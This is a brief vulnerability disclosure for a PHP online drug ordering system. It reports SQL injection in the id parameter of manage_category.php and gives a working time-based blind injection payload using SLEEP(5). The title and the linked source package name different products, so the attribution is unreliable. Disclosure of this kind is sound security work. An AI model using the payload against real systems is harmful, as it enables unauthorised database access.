# SQL injection vulnerability exists in the online drug ordering system

## Vulnerability author:liuyuanyuan

supplier:
https://www.sourcecodester.com/php/15339/online-tutor-portal-site-phpopp-free-source-code.htm

edition: 
1.0

/manage_category.php

The Id parameter has SQL injection. Procedure

Payload: http://localhost:80/omos/admin/?page=categories/manage_category&id=2' AND (SELECT 2244 FROM (SELECT(SLEEP(5)))PpSJ) AND 'JfRg'='JfRg

![image](https://github.com/user-attachments/assets/a6b67572-8d89-4a89-8199-08b2234d65ea)

![image](https://github.com/user-attachments/assets/1300cff4-e4bd-41cd-b019-681595baccc3)
